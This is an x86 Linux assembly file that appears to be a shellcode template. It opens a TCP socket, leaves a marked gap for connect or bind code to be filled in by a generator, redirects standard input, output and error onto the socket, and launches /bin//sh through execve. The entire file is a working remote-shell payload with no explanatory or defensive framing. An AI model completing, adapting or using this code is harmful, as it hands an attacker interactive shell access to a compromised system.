global _start

section .text

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    mov ax, 0x167
    mov bl, 2
    mov cl, 1
    mov dl, 0
    int 0x80

    mov edi, eax ; save socket

    ;;;;;;;;;;;;this is left to be filled by program

    mov cl, 3 ; fd
dup2:
    xor eax, eax
    mov al, 0x3F
    mov ebx, edi ; socket
    dec cl
    int 0x80
    cmp cl, 0
    jnz dup2

execve:
    xor eax, eax
    push eax
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp ; first argument, pointer to executable name
    push eax
    mov edx, esp ; third argument null
    push ebx
    mov ecx, esp ; second argument, pointer to executable name argv[0]
    mov al, 11 ; syscall exeve
    int 0x80




    